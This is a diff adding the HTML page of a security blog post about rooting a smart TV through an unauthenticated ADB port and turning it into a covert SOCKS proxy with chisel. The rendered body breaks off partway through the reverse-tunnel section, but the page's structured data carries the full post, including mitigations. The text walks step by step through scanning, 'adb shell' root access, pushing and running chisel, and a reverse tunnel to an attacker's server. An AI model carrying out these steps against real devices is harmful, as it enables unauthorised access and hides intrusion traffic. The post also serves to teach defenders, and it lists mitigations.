@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Nobody Suspects the TV - From an Open ADB Port to Network Proxy via Chisel | Gill.Singh.A</title>
+<meta name="keywords" content="cybersecurity, hacking, infosec, adb, smart-tv, chisel, pivoting, network-proxy">
+<meta name="description" content="In this blog, I show how an unauthenticated Android Debug Bridge port on a Smart TV gave me an instant root shell on the device, and how I turned that shell into a covert SOCKS proxy using chisel, routing my network traffic through a television set sitting on the network.">
+<meta name="author" content="">
+<link rel="canonical" href="https://Gill-Singh-A.github.io/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://Gill-Singh-A.github.io/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Gill-Singh-A.github.io/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Gill-Singh-A.github.io/favicon.jpg">
+<link rel="apple-touch-icon" href="https://Gill-Singh-A.github.io/favicon.jpg">
+<link rel="mask-icon" href="https://Gill-Singh-A.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://Gill-Singh-A.github.io/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><style>
+.gallery {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 10px;
+  margin: 1.5em 0;
+}
+.gallery img {
+  width: 100%;
+  border-radius: 6px;
+  cursor: pointer;
+  transition: transform 0.2s ease, box-shadow 0.2s ease;
+  aspect-ratio: auto;
+}
+.gallery img:hover {
+  transform: scale(1.02);
+  box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+}
+.gallery-section {
+  margin: 2em 0 0.5em;
+}
+.gallery-section h2 {
+  margin-bottom: 0.3em;
+}
+.gallery-section h2 a {
+  text-decoration: none;
+  color: var(--primary);
+}
+.gallery-section h2 a:hover {
+  text-decoration: underline;
+}
+
+ 
+.lightbox-overlay {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100vw; height: 100vh;
+  background: rgba(0, 0, 0, 0.92);
+  z-index: 9999;
+  justify-content: center;
+  align-items: center;
+  cursor: zoom-out;
+}
+.lightbox-overlay.active {
+  display: flex;
+}
+.lightbox-overlay img {
+  max-width: 92vw;
+  max-height: 92vh;
+  object-fit: contain;
+  border-radius: 4px;
+  box-shadow: 0 0 40px rgba(0,0,0,0.5);
+}
+.lightbox-close {
+  position: fixed;
+  top: 16px; right: 24px;
+  color: #fff;
+  font-size: 2rem;
+  cursor: pointer;
+  z-index: 10000;
+  background: none;
+  border: none;
+  font-family: inherit;
+  line-height: 1;
+  opacity: 0.8;
+}
+.lightbox-close:hover { opacity: 1; }
+
+@media (max-width: 600px) {
+  .gallery { grid-template-columns: 1fr; }
+}
+</style>
+<meta property="og:url" content="https://Gill-Singh-A.github.io/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/">
+  <meta property="og:site_name" content="Gill.Singh.A">
+  <meta property="og:title" content="Nobody Suspects the TV - From an Open ADB Port to Network Proxy via Chisel">
+  <meta property="og:description" content="In this blog, I show how an unauthenticated Android Debug Bridge port on a Smart TV gave me an instant root shell on the device, and how I turned that shell into a covert SOCKS proxy using chisel, routing my network traffic through a television set sitting on the network.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2026-08-07T13:15:00+05:30">
+    <meta property="article:modified_time" content="2026-08-07T13:15:00+05:30">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Hacking">
+    <meta property="article:tag" content="Infosec">
+    <meta property="article:tag" content="Adb">
+    <meta property="article:tag" content="Smart-Tv">
+    <meta property="article:tag" content="Chisel">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Nobody Suspects the TV - From an Open ADB Port to Network Proxy via Chisel">
+  <meta name="twitter:description" content="In this blog, I show how an unauthenticated Android Debug Bridge port on a Smart TV gave me an instant root shell on the device, and how I turned that shell into a covert SOCKS proxy using chisel, routing my network traffic through a television set sitting on the network.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Gill-Singh-A.github.io/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Nobody Suspects the TV - From an Open ADB Port to Network Proxy via Chisel",
+      "item": "https://Gill-Singh-A.github.io/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Nobody Suspects the TV - From an Open ADB Port to Network Proxy via Chisel",
+  "name": "Nobody Suspects the TV - From an Open ADB Port to Network Proxy via Chisel",
+  "description": "In this blog, I show how an unauthenticated Android Debug Bridge port on a Smart TV gave me an instant root shell on the device, and how I turned that shell into a covert SOCKS proxy using chisel, routing my network traffic through a television set sitting on the network.",
+  "keywords": [
+    "cybersecurity", "hacking", "infosec", "adb", "smart-tv", "chisel", "pivoting", "network-proxy"
+  ],
+  "articleBody": "In this blog, I’ll show how an unauthenticated Android Debug Bridge (ADB) port on a Smart TV gave me an instant root shell on the device, and how I turned that shell into a covert SOCKS proxy using chisel, routing my network traffic through a television set sitting in a room somewhere on the network.\nPrologue “The telescreen received and transmitted simultaneously.”\n- George Orwell, 1984\nThe smart TV in the corner of the room is always on, always connected, and always trusted. It sits on the network alongside everything else, pulling firmware updates, streaming content, phoning home to telemetry servers. Nobody monitors its traffic, nobody patches its firmware, and nobody thinks to ask what else it might be doing. Under the hood, it runs Android on a full Linux kernel, and if someone left its debug port open, you don’t need a vulnerability at all. You just need to connect.\nWhat is ADB? ADB (Android Debug Bridge) is a command-line tool that lets developers communicate with an Android device. It provides a Unix shell, file transfer, app installation, log access, and full system-level control. It listens on TCP port 5555 when enabled for network debugging.\nADB was designed for development. It assumes the person connecting is the device’s owner or a trusted developer. Modern Android phones prompt the user to authorize each new ADB connection via an on-screen RSA key confirmation dialog. But many IoT devices running Android, things like Smart TVs, set-top boxes, digital signage players, and kiosks, ship with ADB enabled over the network and no authorization prompt at all. Connect, and you’re in.\nFinding the Open Port A network scan of the internal environment flagged TCP port 5555 open on a host. A quick check with nc confirmed the port was reachable, and an nmap service scan identified it as Android Debug Bridge:\n1 2 nc -zv x.x.x.x 5555 nmap -sV -p 5555 x.x.x.x The service banner confirmed OS: Android. Port 5555 with an ADB service is the fingerprint of an Android device with network debugging wide open.\nConnecting to ADB With ADB installed on my machine, connecting was a single command:\n1 adb connect x.x.x.x No authorization prompt, no pairing code, no credential of any kind. The device accepted the connection immediately.\nInstant Root Shell From there, dropping into a shell was one more command:\n1 adb shell The prompt says it all: tv:/ #. The device is a Smart TV, and id confirms uid=0(root) with membership in every privileged group on the system. Full root access to an Android device, obtained with nothing but a network connection and two commands. No exploit, no credential, no vulnerability.\nIdentifying the Architecture Before deploying any tooling, I checked the device’s CPU architecture:\n1 uname -m The device reported aarch64 (64-bit ARM). This determines which binary to download in the next step.\nWhat is Chisel? Chisel is a fast TCP/UDP tunnel tool written in Go that supports SOCKS5 proxying over HTTP. It compiles to a single static binary with no external dependencies, making it ideal for embedded and IoT devices where you can’t install packages or rely on any runtime being present. One binary, one command, and you have a tunnel.\nDeploying Chisel onto the Device Downloading the Binary On my machine, I downloaded the ARM build of chisel from GitHub releases and decompressed it:\n1 2 wget https://github.com/jpillora/chisel/releases/download/v1.12.0-rc2/chisel_1.12.0-rc2_linux_armv7.gz gunzip chisel_1.12.0-rc2_linux_armv7.gz Pushing It to the Device ADB has a built-in file transfer command. I pushed the binary to a writable directory on the device:\n1 adb push chisel_1.12.0-rc2_linux_armv7 /data/local/tmp/chisel Verifying the Binary On the device, I confirmed the binary was in place, made it executable, and verified it ran:\n1 2 3 4 5 cd /data/local/tmp ls -l file chisel chmod +x chisel ./chisel file confirmed it as a static ELF ARM binary (32-bit ARM binaries are backward compatible with 64-bit ARM processors), and running it without arguments printed its version and usage. Chisel is ready.\nMethod 1: Forward SOCKS Proxy In this mode, chisel runs as a server on the Smart TV, and the attacker connects to it as a client. This works when the device is directly reachable on the network.\nOn the Smart TV:\n1 ./chisel server --socks5 --port 2626 On the attacker’s machine:\n1 chisel client x.x.x.x:2626 1080:socks The client connects to the chisel server on the TV and opens a SOCKS5 proxy on 127.0.0.1:1080 on the attacker’s machine. Any traffic sent through that proxy now exits from the Smart TV’s network interface.\nMethod 2: Reverse SOCKS Proxy If the device is behind a firewall or NAT and can’t accept inbound connections, the direction flips. The attacker runs the chisel server, and the device connects out to it, carrying the SOCKS proxy back through the connection.\nOn the attacker’s machine:\n1 chisel server --reverse --port On the Smart TV:\n1 ./chisel client : R::socks \u0026 The R: prefix tells chisel to expose the SOCKS proxy on the attacker’s side, even though the connection was initiated from the device. The result is identical: a SOCKS5 proxy on the attacker’s localhost, with traffic exiting from the TV. The reverse method is more versatile since it works even when the device can’t accept inbound connections, and it is the go-to approach for devices behind restrictive firewalls.\nConfiguring the Browser I pointed Firefox at the SOCKS proxy:\nSOCKS Host: 127.0.0.1 Port: 1080 SOCKS v5 selected, Proxy DNS when using SOCKS v5 enabled Every HTTP request Firefox makes now travels: browser -\u003e SOCKS proxy -\u003e chisel tunnel -\u003e Smart TV -\u003e destination. The destination sees the TV’s IP address, not the attacker’s.\nThe Proof - Hidden Behind the TV To prove the traffic was exiting from the Smart TV, I set up an HTTP server on another host and browsed to it through the proxy:\nThe HTTP server’s access log shows two sets of requests. The first came from my real IP address (direct connection). The second came from the Smart TV’s IP address, not mine.\nThe attacker’s machine is invisible. The traffic appears to come from a television set that is supposed to be on the network, doing exactly what smart TVs do: making HTTP requests. It blends in perfectly.\nAttack Path The full chain, from an open port to covert network proxy:\nDiscover an Android device on the network with TCP port 5555 open. Identify the service as Android Debug Bridge via nmap. adb connect to the device, no authentication required. adb shell for an interactive root shell. Check the device architecture with uname -m. Download the matching chisel binary and push it to the device via adb push. Run chisel as a SOCKS5 server on the device (forward mode), or use reverse mode if the device can’t accept inbound connections. Connect the chisel client from the attacker’s machine. Point any application (browser, scanner, tools) at the local SOCKS proxy. All traffic now exits from the Smart TV’s IP address, the attacker is hidden. Mitigations An open ADB port is the simplest possible foothold: no exploit, no credentials, just connect. To prevent this:\nDisable ADB over network on all production/deployed devices. ADB should only be enabled during development, never in a deployed environment. Require ADB authorization. If network ADB must remain on, ensure the device enforces RSA key pairing so that only pre-authorized machines can connect. Segment IoT devices onto a dedicated VLAN. Smart TVs, set-top boxes, and similar devices should not share a network with servers, workstations, or sensitive infrastructure. Block port 5555 at the network level. Firewall rules should prevent any traffic to TCP 5555 from outside the management network. Monitor for ADB connections. An ADB session from an unexpected source is a strong indicator of compromise. Alert on new connections to port 5555. Restrict writable directories. On Android IoT devices, limit which directories allow executable files to be written and run. Note The above measures reduce risk significantly but do not guarantee 100% protection - defence in depth is the goal.\nConclusion A Smart TV is a computer. It runs a full operating system, has a network stack, and sits on the same network as everything else. When its debug port is left open and unauthenticated, it takes two commands to get root and a few minutes more to turn it into a network proxy. The traffic exits from a device that’s supposed to be there, making requests that look like normal IoT behavior.\nNobody monitors the TV. Nobody patches the TV. Nobody suspects the TV. That’s exactly what makes it useful.\nReferences Android Debug Bridge (ADB) Documentation chisel - TCP/UDP Tunnel (GitHub) Port Forwarding with Chisel (Ben Heater) HackTricks - ADB Pentesting OWASP - IoT Attack Surface ",
+  "wordCount" : "1445",
+  "inLanguage": "en",
+  "datePublished": "2026-08-07T13:15:00+05:30",
+  "dateModified": "2026-08-07T13:15:00+05:30",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Gill-Singh-A.github.io/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Gill.Singh.A",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Gill-Singh-A.github.io/favicon.jpg"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="https://Gill-Singh-A.github.io/" accesskey="h" title="Gill.Singh.A (Alt + H)">Gill.Singh.A</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="https://Gill-Singh-A.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Gill-Singh-A.github.io/post/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Gill-Singh-A.github.io/gallery/" title="Photography">
+                    <span>Photography</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Gill-Singh-A.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/post/">Posts</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      Nobody Suspects the TV - From an Open ADB Port to Network Proxy via Chisel
+    </h1>
+    <div class="post-description">
+      In this blog, I show how an unauthenticated Android Debug Bridge port on a Smart TV gave me an instant root shell on the device, and how I turned that shell into a covert SOCKS proxy using chisel, routing my network traffic through a television set sitting on the network.
+    </div>
+    <div class="post-meta">
+
+<span title='2026-08-07 13:15:00 +0530 IST'>August 7, 2026</span>&nbsp;·&nbsp;<span>7 min</span>
+
+</div>
+  </header> <details class="toc" >
+    <summary accesskey="c" title="(Alt + C)">
+        <span class="title">Table of Contents</span>
+    </summary>
+
+    <div class="inner"><ul>
+            <li>
+                <a href="#prologue" aria-label="Prologue">Prologue</a></li>
+            <li>
+                <a href="#what-is-adb" aria-label="What is ADB?">What is ADB?</a></li>
+            <li>
+                <a href="#finding-the-open-port" aria-label="Finding the Open Port">Finding the Open Port</a></li>
+            <li>
+                <a href="#connecting-to-adb" aria-label="Connecting to ADB">Connecting to ADB</a></li>
+            <li>
+                <a href="#instant-root-shell" aria-label="Instant Root Shell">Instant Root Shell</a></li>
+            <li>
+                <a href="#identifying-the-architecture" aria-label="Identifying the Architecture">Identifying the Architecture</a></li>
+            <li>
+                <a href="#what-is-chisel" aria-label="What is Chisel?">What is Chisel?</a></li>
+            <li>
+                <a href="#deploying-chisel-onto-the-device" aria-label="Deploying Chisel onto the Device">Deploying Chisel onto the Device</a><ul>
+                    
+            <li>
+                <a href="#downloading-the-binary" aria-label="Downloading the Binary">Downloading the Binary</a></li>
+            <li>
+                <a href="#pushing-it-to-the-device" aria-label="Pushing It to the Device">Pushing It to the Device</a></li>
+            <li>
+                <a href="#verifying-the-binary" aria-label="Verifying the Binary">Verifying the Binary</a></li></ul>
+            </li>
+            <li>
+                <a href="#method-1-forward-socks-proxy" aria-label="Method 1: Forward SOCKS Proxy">Method 1: Forward SOCKS Proxy</a></li>
+            <li>
+                <a href="#method-2-reverse-socks-proxy" aria-label="Method 2: Reverse SOCKS Proxy">Method 2: Reverse SOCKS Proxy</a></li>
+            <li>
+                <a href="#configuring-the-browser" aria-label="Configuring the Browser">Configuring the Browser</a></li>
+            <li>
+                <a href="#the-proof---hidden-behind-the-tv" aria-label="The Proof - Hidden Behind the TV">The Proof - Hidden Behind the TV</a></li>
+            <li>
+                <a href="#attack-path" aria-label="Attack Path">Attack Path</a></li>
+            <li>
+                <a href="#mitigations" aria-label="Mitigations">Mitigations</a><ul>
+                    
+            <li>
+                <a href="#note" aria-label="Note">Note</a></li></ul>
+            </li>
+            <li>
+                <a href="#conclusion" aria-label="Conclusion">Conclusion</a></li>
+            <li>
+                <a href="#references" aria-label="References">References</a>
+            </li>
+        </ul>
+    </div>
+</details>
+
+  <div class="post-content md-content"><p>In this blog, I&rsquo;ll show how an <strong>unauthenticated Android Debug Bridge (ADB) port</strong> on a Smart TV gave me an instant <strong>root shell</strong> on the device, and how I turned that shell into a <strong>covert SOCKS proxy</strong> using <a href="https://github.com/jpillora/chisel"><strong>chisel</strong></a>, routing my network traffic through a television set sitting in a room somewhere on the network.</p>
+<h2 id="prologue">Prologue<a hidden class="anchor" aria-hidden="true" href="#prologue">#</a></h2>
+<blockquote>
+<p><strong>&ldquo;The telescreen received and transmitted simultaneously.&rdquo;</strong><br>
+<em>- George Orwell, 1984</em></p>
+</blockquote>
+<p>The smart TV in the corner of the room is always on, always connected, and always trusted. It sits on the network alongside everything else, pulling firmware updates, streaming content, phoning home to telemetry servers. Nobody monitors its traffic, nobody patches its firmware, and nobody thinks to ask what else it might be doing. Under the hood, it runs Android on a full Linux kernel, and if someone left its debug port open, you don&rsquo;t need a vulnerability at all. You just need to connect.</p>
+<h2 id="what-is-adb">What is ADB?<a hidden class="anchor" aria-hidden="true" href="#what-is-adb">#</a></h2>
+<p><strong>ADB (Android Debug Bridge)</strong> is a command-line tool that lets developers communicate with an Android device. It provides a Unix shell, file transfer, app installation, log access, and full system-level control. It listens on <strong>TCP port 5555</strong> when enabled for network debugging.</p>
+<p>ADB was designed for development. It assumes the person connecting is the device&rsquo;s owner or a trusted developer. Modern Android phones prompt the user to authorize each new ADB connection via an on-screen RSA key confirmation dialog. But many IoT devices running Android, things like <strong>Smart TVs, set-top boxes, digital signage players, and kiosks</strong>, ship with ADB enabled over the network and <strong>no authorization prompt at all</strong>. Connect, and you&rsquo;re in.</p>
+<h2 id="finding-the-open-port">Finding the Open Port<a hidden class="anchor" aria-hidden="true" href="#finding-the-open-port">#</a></h2>
+<p>A network scan of the internal environment flagged <strong>TCP port 5555</strong> open on a host. A quick check with <code>nc</code> confirmed the port was reachable, and an <code>nmap</code> service scan identified it as <strong>Android Debug Bridge</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -zv x.x.x.x <span class="m">5555</span>
+</span></span><span class="line"><span class="cl">nmap -sV -p <span class="m">5555</span> x.x.x.x
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="Open ADB port detected via nc and nmap" loading="lazy" src="/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/assets/images/open_adb_port.png"><br />
+The service banner confirmed <strong>OS: Android</strong>. Port 5555 with an ADB service is the fingerprint of an Android device with network debugging wide open.</p>
+<h2 id="connecting-to-adb">Connecting to ADB<a hidden class="anchor" aria-hidden="true" href="#connecting-to-adb">#</a></h2>
+<p>With ADB installed on my machine, connecting was a single command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">adb connect x.x.x.x
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="Connecting to the unauthenticated ADB service" loading="lazy" src="/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/assets/images/adb_connect.png"><br />
+No authorization prompt, no pairing code, no credential of any kind. The device accepted the connection immediately.</p>
+<h2 id="instant-root-shell">Instant Root Shell<a hidden class="anchor" aria-hidden="true" href="#instant-root-shell">#</a></h2>
+<p>From there, dropping into a shell was one more command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">adb shell
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="Root shell on the Smart TV via ADB" loading="lazy" src="/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/assets/images/root_shell.png"><br />
+The prompt says it all: <strong><code>tv:/ #</code></strong>. The device is a Smart TV, and <code>id</code> confirms <strong>uid=0(root)</strong> with membership in every privileged group on the system. Full root access to an Android device, obtained with nothing but a network connection and two commands. No exploit, no credential, no vulnerability.</p>
+<h2 id="identifying-the-architecture">Identifying the Architecture<a hidden class="anchor" aria-hidden="true" href="#identifying-the-architecture">#</a></h2>
+<p>Before deploying any tooling, I checked the device&rsquo;s CPU architecture:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">uname -m
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="Device architecture: aarch64" loading="lazy" src="/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/assets/images/device_architecture.png"><br />
+The device reported <strong>aarch64</strong> (64-bit ARM). This determines which binary to download in the next step.</p>
+<h2 id="what-is-chisel">What is Chisel?<a hidden class="anchor" aria-hidden="true" href="#what-is-chisel">#</a></h2>
+<p><a href="https://github.com/jpillora/chisel"><strong>Chisel</strong></a> is a fast TCP/UDP tunnel tool written in Go that supports <strong>SOCKS5 proxying</strong> over HTTP. It compiles to a <strong>single static binary</strong> with no external dependencies, making it ideal for embedded and IoT devices where you can&rsquo;t install packages or rely on any runtime being present. One binary, one command, and you have a tunnel.</p>
+<h2 id="deploying-chisel-onto-the-device">Deploying Chisel onto the Device<a hidden class="anchor" aria-hidden="true" href="#deploying-chisel-onto-the-device">#</a></h2>
+<h3 id="downloading-the-binary">Downloading the Binary<a hidden class="anchor" aria-hidden="true" href="#downloading-the-binary">#</a></h3>
+<p>On my machine, I downloaded the ARM build of chisel from <a href="https://github.com/jpillora/chisel/releases">GitHub releases</a> and decompressed it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://github.com/jpillora/chisel/releases/download/v1.12.0-rc2/chisel_1.12.0-rc2_linux_armv7.gz
+</span></span><span class="line"><span class="cl">gunzip chisel_1.12.0-rc2_linux_armv7.gz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pushing-it-to-the-device">Pushing It to the Device<a hidden class="anchor" aria-hidden="true" href="#pushing-it-to-the-device">#</a></h3>
+<p>ADB has a built-in file transfer command. I pushed the binary to a writable directory on the device:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">adb push chisel_1.12.0-rc2_linux_armv7 /data/local/tmp/chisel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="Downloading chisel and pushing it to the Smart TV" loading="lazy" src="/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/assets/images/download_push_chisel.png"><br /></p>
+<h3 id="verifying-the-binary">Verifying the Binary<a hidden class="anchor" aria-hidden="true" href="#verifying-the-binary">#</a></h3>
+<p>On the device, I confirmed the binary was in place, made it executable, and verified it ran:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /data/local/tmp
+</span></span><span class="line"><span class="cl">ls -l
+</span></span><span class="line"><span class="cl">file chisel
+</span></span><span class="line"><span class="cl">chmod +x chisel
+</span></span><span class="line"><span class="cl">./chisel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="chisel binary on the device, verified and executable" loading="lazy" src="/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/assets/images/chisel_on_device.png"><br />
+<code>file</code> confirmed it as a <strong>static ELF ARM binary</strong> (32-bit ARM binaries are backward compatible with 64-bit ARM processors), and running it without arguments printed its version and usage. Chisel is ready.</p>
+<h2 id="method-1-forward-socks-proxy">Method 1: Forward SOCKS Proxy<a hidden class="anchor" aria-hidden="true" href="#method-1-forward-socks-proxy">#</a></h2>
+<p>In this mode, chisel runs as a <strong>server</strong> on the Smart TV, and the attacker connects to it as a <strong>client</strong>. This works when the device is directly reachable on the network.</p>
+<p>On the <strong>Smart TV</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./chisel server --socks5 --port <span class="m">2626</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On the <strong>attacker&rsquo;s machine</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chisel client x.x.x.x:2626 1080:socks
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="chisel tunnel established between attacker and Smart TV" loading="lazy" src="/p/nobody-suspects-the-tv-from-an-open-adb-port-to-network-proxy-via-chisel/assets/images/chisel_tunnel.png"><br />
+The client connects to the chisel server on the TV and opens a <strong>SOCKS5 proxy on <code>127.0.0.1:1080</code></strong> on the attacker&rsquo;s machine. Any traffic sent through that proxy now exits from the Smart TV&rsquo;s network interface.</p>
+<h2 id="method-2-reverse-socks-proxy">Method 2: Reverse SOCKS Proxy<a hidden class="anchor" aria-hidden="true" href="#method-2-reverse-socks-proxy">#</a></h2>
+<p>If the device is behind a firewall or NAT and can&rsquo;t accept inbound connections, the direction flips. The attacker runs the chisel <strong>server</strong>, and the device connects <strong>out</strong> to it, carrying the SOCKS proxy back through the connection.</p>
+<p>On the <strong>attacker&rsquo;s machine</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chisel server --reverse --port &lt;attacker_port&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On the <strong>Smart TV</strong>:</p>
